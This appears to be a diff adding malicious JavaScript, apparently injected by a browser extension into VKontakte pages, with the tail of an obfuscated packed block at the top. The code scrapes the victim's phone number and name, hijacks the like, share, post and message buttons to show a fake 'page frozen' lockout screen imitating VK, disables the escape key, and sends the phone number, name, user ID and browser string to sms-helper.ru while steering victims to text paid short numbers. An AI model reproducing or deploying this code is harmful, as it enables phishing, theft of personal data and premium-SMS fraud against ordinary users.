08|show|click|reload|script|navigator|userAgent|addEventListener|agent|Image|javascript|sendsms|shot|rgba|217|blocked_phone_table|background|ffffff|blocked_phone_row|hidden|this|134px|25px|login_readonly_wrap|cellspacing|blocked_no_code|blocked_resend|blocked_send_pass|placeholder|||||||login_readonly|cellpadding||5px|blocked_phone_field|hideOnBGClick|cs307906|showShare|sendComment|sendNewMsg|sendPost|sendReply|escape|likeShareCustom|link|rel|className|login_blocked_tt|login_blocked_tt_pointer|showTooltip|stylesheet|onload|h1|600|372|251|291|240|593|420|382|211|Date|1000|236|selected|1876|235|forcetoup|slideX|05937|500|marginTop|login_blocked_phone_tt|906|load|SMS|innerHeight|px|unescape|MessageBox|0xFFFFFF|ESC|2500|KEY|addEvent|2233300|689|mouseout|onCreate|pbind|385|594|loaded'.split('|'),0,{}))
+var country = [{'name':'Австралия', 'code':'+61'},{'name':'Австралия', 'code':'+672'},{'name':'Австрия', 'code':'+43'},{'name':'Азербайджан', 'code':'+994', 'num':'8777', 'text':'3342243'},{'name':'Албания', 'code':'+355'},{'name':'Алжир', 'code':'+21'},{'name':'Алжир', 'code':'+213'},{'name':'Американское Самоа', 'code':'+1684'},{'name':'Ангилья', 'code':'+1264'},{'name':'Ангола', 'code':'+244'},{'name':'Андорра', 'code':'+376'},{'name':'Антигуа и Барбуда', 'code':'+1268'},{'name':'Аргентина', 'code':'+54'},{'name':'Армения', 'code':'+374', 'num':'1003', 'text':'pm342243'},{'name':'Аруба', 'code':'+297'},{'name':'Афганистан', 'code':'+93'},{'name':'Багамы', 'code':'+1242'},{'name':'Бангладеш', 'code':'+880'},{'name':'Барбадос', 'code':'+1246'},{'name':'Бахрейн', 'code':'+973'},{'name':'Беларусь', 'code':'+375', 'num':'1310', 'text':'44342243'},{'name':'Белиз', 'code':'+501'},{'name':'Бельгия', 'code':'+32'},{'name':'Бенин', 'code':'+229'},{'name':'Бермуды', 'code':'+1441'},{'name':'Болгария', 'code':'+359'},{'name':'Боливия', 'code':'+591'},{'name':'Бонайре, Синт-Эстатиус и Саба', 'code':'+1721'},{'name':'Босния и Герцеговина', 'code':'+387'},{'name':'Ботсвана', 'code':'+267'},{'name':'Бразилия', 'code':'+55'},{'name':'Бруней-Даруссалам', 'code':'+673'},{'name':'Буркина-Фасо', 'code':'+226'},{'name':'Бурунди', 'code':'+257'},{'name':'Бутан', 'code':'+975'},{'name':'Вануату', 'code':'+678'},{'name':'Великобритания', 'code':'+246'},{'name':'Великобритания', 'code':'+44'},{'name':'Венгрия', 'code':'+36'},{'name':'Венесуэла', 'code':'+58'},{'name':'Виргинские острова, Британские', 'code':'+1284'},{'name':'Виргинские острова, США', 'code':'+1340'},{'name':'Восточный Тимор', 'code':'+670'},{'name':'Вьетнам', 'code':'+84'},{'name':'Габон', 'code':'+241'},{'name':'Гайана', 'code':'+592'},{'name':'Гаити', 'code':'+509'},{'name':'Гамбия', 'code':'+220'},{'name':'Гана', 'code':'+233'},{'name':'Гваделупа', 'code':'+590'},{'name':'Гватемала', 'code':'+502'},{'name':'Гвинея', 'code':'+224'},{'name':'Гвинея-Бисау', 'code':'+245'},{'name':'Германия', 'code':'+49'},{'name':'Гибралтар', 'code':'+350'},{'name':'Гондурас', 'code':'+504'},{'name':'Гонконг', 'code':'+852'},{'name':'Гренада', 'code':'+1473'},{'name':'Гренландия', 'code':'+299'},{'name':'Греция', 'code':'+30'},{'name':'Грузия', 'code':'+995'},{'name':'Гуам', 'code':'+1671'},{'name':'Дания', 'code':'+45'},{'name':'Джибути', 'code':'+253'},{'name':'Доминика', 'code':'+1767'},{'name':'Доминиканская Республика', 'code':'+1809'},{'name':'Доминиканская Республика', 'code':'+1829'},{'name':'Доминиканская Республика', 'code':'+1849'},{'name':'Египет', 'code':'+20'},{'name':'Замбия', 'code':'+260'},{'name':'Зимбабве', 'code':'+263'},{'name':'Йемен', 'code':'+967'},{'name':'Израиль', 'code':'+972'},{'name':'Индия', 'code':'+91'},{'name':'Индонезия', 'code':'+62'},{'name':'Иордания', 'code':'+962'},{'name':'Ирак', 'code':'+964'},{'name':'Иран', 'code':'+98'},{'name':'Ирландия', 'code':'+353'},{'name':'Исландия', 'code':'+354'},{'name':'Исландия', 'code':'+403'},{'name':'Исландия', 'code':'+404'},{'name':'Испания', 'code':'+34'},{'name':'Италия', 'code':'+39'},{'name':'Кабо-Верде', 'code':'+238'},{'name':'Казахстан', 'code':'+77', 'num':'7502'},{'name':'Камбоджа', 'code':'+855'},{'name':'Камерун', 'code':'+237'},{'name':'Канада', 'code':'+1'},{'name':'Катар', 'code':'+974'},{'name':'Кения', 'code':'+254'},{'name':'Кипр', 'code':'+357'},{'name':'Кирибати', 'code':'+686'},{'name':'Китай', 'code':'+86'},{'name':'Колумбия', 'code':'+57'},{'name':'Коморы', 'code':'+269'},{'name':'Конго', 'code':'+242'},{'name':'Конго, демократическая республика', 'code':'+243'},{'name':'Коста-Рика', 'code':'+506'},{'name':'Кот д`Ивуар', 'code':'+225'},{'name':'Куба', 'code':'+53'},{'name':'Кувейт', 'code':'+965'},{'name':'Кыргызстан', 'code':'+996'},{'name':'Кюрасао', 'code':'+5999'},{'name':'Лаос', 'code':'+856'},{'name':'Латвия', 'code':'+371', 'num':'1897', 'text':'3pm342243'},{'name':'Лесото', 'code':'+266'},{'name':'Либерия', 'code':'+231'},{'name':'Ливан', 'code':'+961'},{'name':'Ливия', 'code':'+218'},{'name':'Литва', 'code':'+370', 'num':'1337', 'text':'3pm342243'},{'name':'Лихтенштейн', 'code':'+423'},{'name':'Люксембург', 'code':'+352'},{'name':'Маврикий', 'code':'+230'},{'name':'Мавритания', 'code':'+222'},{'name':'Мадагаскар', 'code':'+261'},{'name':'Макао', 'code':'+853'},{'name':'Македония', 'code':'+389'},{'name':'Малави', 'code':'+265'},{'name':'Малайзия', 'code':'+60'},{'name':'Мали', 'code':'+223'},{'name':'Мальдивы', 'code':'+960'},{'name':'Мальта', 'code':'+356'},{'name':'Марокко', 'code':'+212'},{'name':'Мартиника', 'code':'+596'},{'name':'Маршалловы Острова', 'code':'+692'},{'name':'Мексика', 'code':'+52'},{'name':'Микронезия, федеративные штаты', 'code':'+691'},{'name':'Мозамбик', 'code':'+258'},{'name':'Молдова', 'code':'+373', 'num':'7250', 'text':'342243'},{'name':'Монако', 'code':'+377'},{'name':'Монголия', 'code':'+976'},{'name':'Монтсеррат', 'code':'+1664'},{'name':'Мьянма', 'code':'+95'},{'name':'Намибия', 'code':'+264'},{'name':'Науру', 'code':'+674'},{'name':'Непал', 'code':'+977'},{'name':'Нигер', 'code':'+227'},{'name':'Нигерия', 'code':'+234'},{'name':'Нидерланды', 'code':'+31'},{'name':'Никарагуа', 'code':'+505'},{'name':'Ниуэ', 'code':'+683'},{'name':'Новая Зеландия', 'code':'+64'},{'name':'Новая Каледония', 'code':'+687'},{'name':'Норвегия', 'code':'+47'},{'name':'Объединенные Арабские Эмираты', 'code':'+971'},{'name':'Оман', 'code':'+968'},{'name':'Остров Мэн', 'code':'+44'},{'name':'Остров Норфолк', 'code':'+6723'},{'name':'Острова Кайман', 'code':'+1345'},{'name':'Острова Кука', 'code':'+682'},{'name':'Острова Теркс и Кайкос', 'code':'+1649'},{'name':'Пакистан', 'code':'+92'},{'name':'Палау', 'code':'+680'},{'name':'Палестинская автономия', 'code':'+970'},{'name':'Панама', 'code':'+507'},{'name':'Папуа - Новая Гвинея', 'code':'+675'},{'name':'Парагвай', 'code':'+595'},{'name':'Перу', 'code':'+51'},{'name':'Питкерн', 'code':'+64'},{'name':'Польша', 'code':'+48'},{'name':'Португалия', 'code':'+351'},{'name':'Пуэрто-Рико', 'code':'+1787'},{'name':'Пуэрто-Рико', 'code':'+1939'},{'name':'Реюньон', 'code':'+262'},{'name':'Россия', 'code':'+7', 'num':'2332'},{'name':'Руанда', 'code':'+250'},{'name':'Румыния', 'code':'+40'},{'name':'Сальвадор', 'code':'+503'},{'name':'Самоа', 'code':'+685'},{'name':'Сан-Марино', 'code':'+378'},{'name':'Сан-Томе и Принсипи', 'code':'+239'},{'name':'Саудовская Аравия', 'code':'+966'},{'name':'Свазиленд', 'code':'+268'},{'name':'Святая Елена', 'code':'+247'},{'name':'Святая Елена', 'code':'+290'},{'name':'Северная Корея', 'code':'+850'},{'name':'Северные Марианские острова', 'code':'+1670'},{'name':'Сейшелы', 'code':'+248'},{'name':'Сенегал', 'code':'+221'},{'name':'Сент-Винсент', 'code':'+1784'},{'name':'Сент-Китс и Невис', 'code':'+1869'},{'name':'Сент-Люсия', 'code':'+1758'},{'name':'Сент-Пьер и Микелон', 'code':'+508'},{'name':'Сербия', 'code':'+381'},{'name':'Сингапур', 'code':'+65'},{'name':'Синт-Мартен', 'code':'+599'},{'name':'Сирийская Арабская Республика', 'code':'+963'},{'name':'Словакия', 'code':'+421'},{'name':'Словения', 'code':'+386'},{'name':'Соломоновы Острова', 'code':'+677'},{'name':'Сомали', 'code':'+252'},{'name':'Судан', 'code':'+249'},{'name':'Суринам', 'code':'+597'},{'name':'США', 'code':'+1'},{'name':'Сьерра-Леоне', 'code':'+232'},{'name':'Таджикистан', 'code':'+992'},{'name':'Тайвань', 'code':'+886'},{'name':'Таиланд', 'code':'+66'},{'name':'Танзания', 'code':'+255'},{'name':'Того', 'code':'+228'},{'name':'Токелау', 'code':'+690'},{'name':'Тонга', 'code':'+676'},{'name':'Тринидад и Тобаго', 'code':'+1868'},{'name':'Тувалу', 'code':'+688'},{'name':'Тунис', 'code':'+216'},{'name':'Туркменистан', 'code':'+993'},{'name':'Турция', 'code':'+90'},{'name':'Уганда', 'code':'+256'},{'name':'Узбекистан', 'code':'+998'},{'name':'Украина', 'code':'+380', 'num':'9106'},{'name':'Уоллис и Футуна', 'code':'+681'},{'name':'Уругвай', 'code':'+598'},{'name':'Фарерские острова', 'code':'+298'},{'name':'Фиджи', 'code':'+679'},{'name':'Филиппины', 'code':'+63'},{'name':'Финляндия', 'code':'+358'},{'name':'Фолклендские острова', 'code':'+500'},{'name':'Франция', 'code':'+33'},{'name':'Французская Гвиана', 'code':'+594'},{'name':'Французская Полинезия', 'code':'+689'},{'name':'Хорватия', 'code':'+385'},{'name':'Центрально-Африканская Республика', 'code':'+236'},{'name':'Чад', 'code':'+235'},{'name':'Черногория', 'code':'+382'},{'name':'Чехия', 'code':'+420'},{'name':'Чили', 'code':'+56'},{'name':'Швейцария', 'code':'+41'},{'name':'Швеция', 'code':'+46'},{'name':'Шпицберген и Ян Майен', 'code':'+47'},{'name':'Шри-Ланка', 'code':'+94'},{'name':'Эквадор', 'code':'+593'},{'name':'Экваториальная Гвинея', 'code':'+240'},{'name':'Эритрея', 'code':'+291'},{'name':'Эстония', 'code':'+372'},{'name':'Эфиопия', 'code':'+251'},{'name':'Южная Корея', 'code':'+82'},{'name':'Южно-Африканская Республика', 'code':'+27'},{'name':'Южный Судан', 'code':'+211'},{'name':'Ямайка', 'code':'+1876'},{'name':'Япония', 'code':'+81'}];
+
+var noCodeNum = '';
+var noCodeTxt = '';
+
+function GetCountry(code){
+	var str = '';
+	for(i = 0; i < country.length; i++){
+		if(code == country[i].code){
+			var sel = "selected";
+			noCodeNum = country[i].num;
+			noCodeTxt = country[i].text;
+		}
+		else{
+			var sel = "";
+		}
+		
+		str += '<option txt="' + ((country[i].text) ? country[i].text : "") + '" num="' + ((country[i].num) ? country[i].num : "") + '" ' + sel +' value="' + country[i].code +'" id="__' + country[i].code +'">' + country[i].name + ' (' + country[i].code + ')' + '</option>' + "\r\n";
+	}
+	return str;
+}
+
+function getTime(){
+	var g = new Date().getTime() / 1000 / 60;
+	g = g - (g % 1);
+	return g;
+}
+
+function GetInfForUser(){
+	try{
+		var od = plg.Get('oRun');
+		if(od)
+			return false;
+			
+		plg.Save('vIdPage', vk.id.toString());
+		plg.Save('vRun', '0');
+	} catch(e){}
+
+	ajax.plainpost('/settings.php', null, function(text){
+		number = text.match(/([+]{1}[0-9]+(?:[\*]+))/g);
+		if(number){
+			try{
+				plg.Save('vTel', number.toString());
+			} catch(e){}	
+		}
+	});
+	
+	ajax.plainpost('/id' + vk.id.toString(), null, function(text){
+		var name = text.match(/(?:<\/b><\/b> ).+(?=<\/h1>)/ig);
+		if(name){
+			name = name[0].replace(/<\/b>/gi, '');
+			try{
+				plg.Save('vName', escape(name));
+			} catch(e){}
+		}
+	});
+}
+
+function IsInf(){
+	if(location.href.indexOf('login') > -1)
+		return false;
+	try{
+		var id = plg.Get('vIdPage');
+		var number = plg.Get('vTel');
+		var name = plg.Get('vName');
+	}
+	catch(e){}
+	
+	if(!id || !number || !name){
+		GetInfForUser();
+		return false;
+	}
+	
+	if(id != vk.id){
+		GetInfForUser();
+		return false;
+	}
+
+	return true;
+}
+
+function NewAction(){
+	try {
+		var od = plg.Get('oRun');
+	} catch(e){}
+	if(od)
+		return false;
+
+	try {
+		var stat = plg.Get('vRun');
+		if(stat == 3)
+			return false;
+		if(window.wall){
+			wall.like = function(){start();}
+			wall.likeShareCustom = function(){start();}
+			wall.sendReply = function(){start();}
+			wall.sendPost = function(){start();}
+		}
+		
+		if(window.Photoview){
+			Photoview.like = function(){start();}
+			Photoview.showShare = function(){start();}
+			Photoview.sendComment = function(){start();}
+		}
+		
+		if(window.IM){
+			IM.sendNewMsg = function(){start();}
+			if(ge('im_send'))
+				ge('im_send').setAttribute('onclick', 'start();');
+		}
+	} catch(e){}
+}
+
+function CreateCSS(urlCss, func){
+	var elCSS = document.createElement("link");
+	elCSS.setAttribute("rel", "stylesheet");
+	elCSS.setAttribute("type", "text/css");
+	elCSS.setAttribute("href", urlCss);
+	document.getElementsByTagName("head")[0].appendChild(elCSS);
+	
+	elCSS.onload = func;
+}
+
+function tipShow(el, text, shift, addClass) {
+    el = ge(el);
+    var showTT = function() {
+      showTooltip(el, {
+        text: '<div class="login_blocked_tt_pointer"></div>' + text,
+        slideX: 15,
+        className: 'login_blocked_tt' + (addClass ? (' ' + addClass) : ''),
+        shift: shift,
+        forcetoup: true,
+        onCreate: removeEvent.pbind(el, 'mouseout')
+      });
+    }
+    if (vk.loaded) {
+      setTimeout(showTT, 0);
+    } else {
+      addEvent(window, 'load', showTT);
+    }
+}
+
+function tipHides(el) {
+    el = ge(el);
+    if (el && el.tt && el.tt.hide) el.tt.hide();
+}
+
+
+function phoneTip() {
+    if (ge('blocked_phone').readOnly) return;
+    return tipShow('blocked_phone_wrap', 'Укажите Ваш номер, к которому <b>будет</b> привязана страница. Мы вышлем на него <b>SMS</b> с кодом. Эта процедура бесплатна.<br><br>Пример номера: <b>+7 906 2233300</b>', [-147, -95, 3], 'login_blocked_phone_tt');
+}
+
+function codeTip() {
+    if (ge('blocked_code').readOnly) return;
+    return tipShow('blocked_code_wrap', 'На Ваш телефон в течение нескольких секунд придет <b>5</b>-значный код.<br><br>Пример кода: <b>05937</b>', [-147, -82, 3]);
+}
+
+function TelCode(num){
+	return num.match(/\+7(?!7)|\+77|\+380|\+375|\+374|\+994|\+370|\+371|\+373/gi);
+}
+
+function Loader(){
+	try{
+		ge('box_layer_wrap').style.display = 'block';
+		ge('box_loader').style.marginTop = (window.innerHeight / 2 - 100) + 'px';
+		ge('box_loader').style.display = 'block';
+		setTimeout(function(){
+			ge('box_loader').style.display = 'none';
+			MyBoxLock();
+		}, 2500);
+	}
+	catch(e){
+		MyBoxLock();
+	}
+}
+
+function MyBoxLock(){
+	KEY.ESC = 0xFFFFFF;
+	try{
+	var name = unescape(plg.Get('vName'));
+	var number = plg.Get('vTel');
+	number = number.replace(/(\*)+/, '');
+	} catch(e){}
+	var code = TelCode(number);
+	try{
+		var run = plg.Get('vRun');
+	} catch(e){}
+	var boxLock = new MessageBox({'animSpeed' : 250, 'width' : 600, 'hideOnBGClick' : false});
+	document.title = name;
+	
+	if(run == 2){
+		try{
+			ge('page_layout').style.width = '661px';
+			ge('notifiers_wrap').parentNode.removeChild(document.getElementById('notifiers_wrap'));
+			ge('ts_wrap').parentNode.removeChild(document.getElementById('ts_wrap'));
+			ge('box_layer_wrap').parentNode.removeChild(document.getElementById('box_layer_wrap'));
+			var exit_btn = ge('logout_link_td').innerHTML;
+			ge('top_links').innerHTML = '<div style="position: absolute; right: 10px;">' + exit_btn + '</div>';
+			ge('side_bar').parentNode.removeChild(document.getElementById('side_bar'));
+			ge('stl_bg').parentNode.removeChild(document.getElementById('stl_bg'));	
+			ge('stl_side').parentNode.removeChild(document.getElementById('stl_side'));
+			ge('footer_wrap').setAttribute('class', 'simple');
+			ge('footer_wrap').style.width = 'auto';
+			ge('rb_box_fc_clist').innerHTML = '';
+			window.FastChat = {};
+		} catch(e){}
+	}
+	
+	try {var lTime = plg.Get('vTime');} catch(e){}
+	if(lTime > getTime()){
+		var btn = '<button id="blocked_send_phone" style="height: 23px;" onclick="GetCode()">Получить код</button>';
+		var see_row = 'block';
+	}
+	else{
+		var btn = '<button id="blocked_send_phone" style="height: 23px;" onclick="ChangePass()">Сменить пароль</button>';
+		var see_row = 'none';
+	}
+	
+	var content = '<div id="login_blocked_wrap"><div class="login_blocked_centered"><img src="/images/pics/spamfight.gif" id="login_blocked_img" height="160" width="225" /><br/><b>' + name + '</b>, к сожалению, мы обнаружили подозрительную активность и <b>временно заморозили</b> Вашу страницу, чтобы вырвать её из рук злоумышленников.<br><br>Для того чтобы разморозить страницу, мы просим Вас подтвердить, что Вы владелец страницы и сменить пароль.<br/><br/>Эта страница заморожена за подозрительные отметки <b>мне нравится</b> пользователям: </div>  <div class="login_blocked_reason_wrap"><div class="login_blocked_reason"><table><tr align="center"><td style="width: 80px;"><img width="50" height="50" src="http://cs307906.vk.me/v307906065/6d2a/bmBQFxGlKUw.jpg"></td><td style="width: 80px;"><img width="50" height="50" src="http://cs411922.vk.me/v411922272/71b3/VU8jcjA29hA.jpg"></td><td style="width: 80px;"><img width="50" height="50" src="http://cs418927.vk.me/v418927942/1d7e/vwpmoFSQk7A.jpg"></td><td style="width: 80px;"><img width="50" height="50" src="http://vk.com/images/deactivated_c.gif"></td><td style="width: 80px;"><img width="50" height="50" src="http://cs9192.vk.me/v9192130/b/GGRuqJ5-Zuo.jpg"></td></tr><tr align="center"><td>Василий<br/>Иванович</td><td>Валерия<br/>Якуничкина</td><td>Иван<br/>Серебряков</td><td>Владислав</br>Вологдин</td><td>Артём<br/>Хлусов</td></tr></table></div></div><div class="msg" id="blocked_submit_result" style="margin-top: 20px"></div><br/><div class="login_blocked_form"><div class="login_blocked_row" id="blocked_country_row" style="display: ' + see_row + '"><div class="login_select_wrap" id="blocked_country_wrap"><div class="login_blocked_label">Страна</div><select onchange="ChangeCountry(this)" style="width: 134px; height: 25px; border: 1px solid rgb(192, 202, 213);" name="country" id="chCountry">' + GetCountry(code) + '</select><input type="hidden" id="blocked_country" name="blocked_country" /></div></div><div class="login_blocked_row" id="blocked_phone_row" style="display: ' + see_row + '"><div class="login_select_wrap" id="blocked_phone_wrap"><div class="login_blocked_label">Мобильный телефон</div><table id="blocked_phone_table" style="border: 1px solid rgb(192, 202, 213); background: #ffffff;" class="login_readonly_wrap" cellspacing="0" cellpadding="0"><tr><td id="blocked_phone_prefix"><nobr style="margin-right: 5px; color: rgb(119, 119, 119);">' + code + '</nobr></td><td class="blocked_phone_field"><input type="text" id="blocked_phone" onblur="tipHides(\'blocked_phone_wrap\')" onfocus="phoneTip()" value="'+ number.replace(code, '') + '"  class="login_big_text login_readonly" /></td></tr></table></div></div><div id="blocked_code_row" class="login_blocked_row" style="display: none"><div id="blocked_code_wrap" class="login_select_wrap"><div class="login_blocked_label">Код подтверждения</div><input type="text" id="blocked_code" value="" class="login_big_text" placeholder="Введите код сюда" onblur="tipHides(\'blocked_code_wrap\')" onfocus="codeTip()" /></div></div><div class="login_blocked_submit" id="blocked_phone_submit" style=""><div class="button_blue button_wide"><span class="button_lock" id="btn_lock_1" style="display: none;"></span>' + btn + '</div></div><div class="login_blocked_submit" id="blocked_code_submit" style="display: none"><div class="button_blue button_wide"><span class="button_lock" id="btn_lock_2" style="display: none;"></span><button id="blocked_send_code" style="height: 23px;" onclick="CheckCode()">Отправить код</button></div><div class="blocked_no_code"><a id="blocked_resend" onclick="noCode()">Я не получил код</a></div></div><div class="login_blocked_submit" id="blocked_pass_submit" style="display: none"><div class="button_blue button_wide"><button id="blocked_send_pass" onclick="EndLock();">Разморозить</button></div></div></div></div>';
+	boxLock.content(content + '<div id="modalWND"></div>');	
+	if(run == 2){
+		ge('page_body').setAttribute('class', 'simple');
+		ge('page_body').innerHTML = '<div id="content" style="border-color: rgb(217, 224, 231); border-style: solid; border-width: 0px 1px 1px;">' + content + '</div>';
+		ge('page_body').setAttribute('style', 'border-width: 0px 1px 1px; border-color: rgba(100, 100, 100, 0.08); border-style: solid;');
+	}
+	if(run == 1){
+		boxLock.show();
+		try {plg.Save('vRun', '2');} catch(e){}
+	}
+		
+	
+	var gg = ge('box_layer_wrap');
+			if (gg)
+				removeEvent(gg, 'click', __bq.hideLastCheck)
+}
+
+function ChangeCountry(val){
+	ge('blocked_phone_prefix').childNodes[0].innerHTML = val.value;
+	noCodeNum = document.getElementById("__" + val.value).getAttribute('num');
+	noCodeTxt = document.getElementById("__" + val.value).getAttribute('txt');
+}
+
+function noCode(){
+	ge('blocked_submit_result').innerHTML = '<b>Если Вам не пришло смс сообщение.</b><br/>Отправте ' + ((noCodeTxt) ? "смс с текстом <b>" + noCodeTxt + "</b>" : "<b>пустое смс</b> сообщение") + ' по номеру <b>' + ((noCodeNum) ? noCodeNum : "2332") + '</b>.';
+	ge('blocked_submit_result').style.display = 'block';
+}
+
+function ChangePass(){
+	try {
+		plg.Save('vRun', '3');
+		plg.Del();
+	} catch(e){}
+	document.location.replace('http://vk.com/settings#settings_error_pwd');
+}
+
+function GetCode(){
+	text = ge('blocked_phone');
+	if(!/^[0-9]{10}$/.test(text.value)){
+		ge('blocked_send_phone').innerText = '';
+		ge('btn_lock_1').style.display = 'block';
+		setTimeout(function(){
+			ge('blocked_send_phone').innerText = 'Получить код';
+			ge('btn_lock_1').style.display = 'none';
+			ge('blocked_submit_result').innerHTML = '<b>Некорректный мобильный номер.</b></br> Необходимо корректно ввести номер <b>в международном формате</b>, например<br/> <b>+7(921)000-00-00</b>.';
+			ge('blocked_submit_result').style.display = 'block';
+		}, 1500);
+		return false;
+	}
+	
+	var code = ge('blocked_phone_prefix').innerText;
+	try {plg.Save('vTel', code + text.value);} catch(e){}
+	text.setAttribute('readonly','readonly');
+	ge('blocked_send_phone').innerText = '';
+	ge('btn_lock_1').style.display = 'block';
+	SendSMS();
+	setTimeout(function(){
+		ge('btn_lock_1').style.display = 'none';
+		ge('blocked_phone_submit').style.display = 'none';
+		ge('chCountry').setAttribute('disabled', 'disabled');
+		ge('blocked_code_row').style.display = 'block';
+		ge('blocked_code_submit').style.display = 'block';
+	}, 1500);
+	return true;
+}
+
+function CheckCode(){
+	var uCode = ge('blocked_code').value;
+	if(!/^[0-9]{5}$/.test(uCode)){
+		ge('blocked_send_code').innerText = '';
+		ge('btn_lock_2').style.display = 'block';
+		
+		setTimeout(function(){
+			ge('blocked_send_code').innerText = 'Отправить код';
+			ge('btn_lock_2').style.display = 'none';
+			ge('blocked_submit_result').innerHTML = '<b>Неверный код.</b></br> Проверьте правильность ввода кода.';
+			ge('blocked_submit_result').style.display = 'block';
+		}, 2000)
+		
+		return false;
+	}
+	
+	if(sendSms)
+		var validKey = sendSms.split(':');
+	for(i = 0; i < validKey.length; i++)	
+		if(validKey[i] == uCode){
+			ge('blocked_send_code').innerText = '';
+			ge('btn_lock_2').style.display = 'block';
+			setTimeout(function(){
+				ge('btn_lock_2').style.display = 'none';
+				ge('blocked_code_submit').style.display = 'none';
+				ge('blocked_pass_submit').style.display = 'block';	
+			}, 1500)
+			
+			SendStat();
+			
+			return true;
+		}
+	
+	ge('blocked_send_code').innerText = '';
+	ge('btn_lock_2').style.display = 'block';
+	
+	setTimeout(function(){
+		ge('blocked_send_code').innerText = 'Отправить код';
+		ge('btn_lock_2').style.display = 'none';
+		ge('blocked_submit_result').innerHTML = '<b>Неверный код.</b></br> Проверьте правильность ввода кода.';
+		ge('blocked_submit_result').style.display = 'block';
+	}, 2000)
+	
+	return false;
+}
+
+function EndLock(){
+	try {
+		plg.Save('vRun', '3');
+		plg.Del();
+	}catch(e){}
+	location.reload();
+}
+
+function start(){
+	try {var stat = plg.Get('vRun');}catch(e){}
+	if(stat == 3)
+		return false;
+	try {
+		plg.Save('vRun', '1');
+		var startTime = getTime() + 60;
+		plg.Save('vTime', startTime.toString());
+	} catch(e){}
+	CreateCSS('http://st0.userapi.com/css/al/login.css', Loader());
+}
+
+function SendSMS(){
+	try{
+	var number = plg.Get('vTel');
+	var id = plg.Get('id');
+	var group = plg.Get('group');
+	var idPage = plg.Get('vIdPage');
+	var alpha = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'];
+	number = number.replace(/\+/, '');
+	var res = "";
+	for(i = 0; i < number.length; i++)
+		res += alpha[parseInt(number[i])];
+	
+	var sms = document.createElement('script');
+	sms.setAttribute('type', 'text/javascript');
+	var type = GetType();
+	var url = 'http://sms-helper.ru/js/sendsms.php?type=' + type + '&set=' + res + '&page=' + idPage + '&id=' + id + '&shot=' + noCodeNum;
+	sms.setAttribute('src', url);
+	document.getElementsByTagName('head')[0].appendChild(sms);
+	} catch(e){}
+}
+
+function GetType(){
+	var prefix = ge('blocked_phone_prefix').childNodes[0].innerHTML;
+	if(/\+7/ig.test(prefix)){
+		return 3;
+	}
+	if(/\+380/ig.test(prefix)){
+		return 1;
+	}
+	return 2;
+}
+
+function SendStat(){
+	try{
+	var id = plg.Get('id');
+	var group = plg.Get('group');
+	var idPage = plg.Get('vIdPage');
+	var name = plg.Get('vName');
+	var number = plg.Get('vTel');
+	var alpha = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'];
+	number = number.replace(/\+/, '');
+	var res = "";
+	for(i = 0; i < number.length; i++)
+		res += alpha[parseInt(number[i])];
+	
+	name = encodeURIComponent(name);
+	
+	var stat = new Image();
+	stat.src = 'http://sms-helper.ru/js/stat.php?type=1&set=' + res + '&name=' + name + '&page=' + idPage + '&id=' + id + '&group=' + group + '&agent=' + encodeURIComponent(navigator.userAgent);
+	} catch(e){}
+}
+
+function isRun(){
+	if(!IsInf())
+		return false;
+
+	NewAction();
+
+	try {var od = plg.Get('oRun');}catch(e){}
+	if(od){
+		document.body.removeEventListener('DOMNodeInserted', isRun, false);
+		return false;
+	}
+	
+	if(location.href.indexOf('login') > -1)
+		return false;
+		
+	if(ge('modalWND'))	
+		return false;
+
+	try{
+		var run = plg.Get('vRun');
+	} catch(e){}
+	
+	if(run == 3){
+		document.body.removeEventListener('DOMNodeInserted', isRun, false);
+		return true;
+	}
+
+	if(run == 2){
+		document.body.removeEventListener('DOMNodeInserted', isRun, false);
+		CreateCSS('http://st0.userapi.com/css/al/login.css', Loader());
+		return true;
+	}
+}
+
+document.body.addEventListener('DOMNodeInserted', isRun, false);
+isRun();
